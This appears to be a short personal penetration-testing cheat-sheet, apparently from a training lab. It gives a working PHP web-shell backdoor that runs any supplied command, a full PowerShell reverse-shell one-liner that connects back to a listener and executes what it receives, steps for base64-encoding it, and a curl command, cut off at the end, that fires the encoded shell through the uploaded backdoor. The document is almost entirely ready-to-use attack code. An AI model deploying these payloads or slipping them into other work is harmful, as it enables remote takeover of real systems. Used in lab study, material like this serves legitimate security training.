---
IP_KALI: 192.168.45.228
SHELL_BASE64: 
IP_TARGET: 192.168.115.75
---
Simple PHP backdoor:
```
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

Create a PS reverse shell one liner and encode it since it has special characters:
```
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.173",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```
```
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
```
```
$EncodedText =[Convert]::ToBase64String($Bytes)
```
```
$EncodedText
```

Combine curl command with powershell including the -enc parameter so that the base64 encoding is taken into account:
```
curl http://192.168.132.16/index.php/var/www/html/backdoor.pHP?cmd=powershell%20-enc%
```
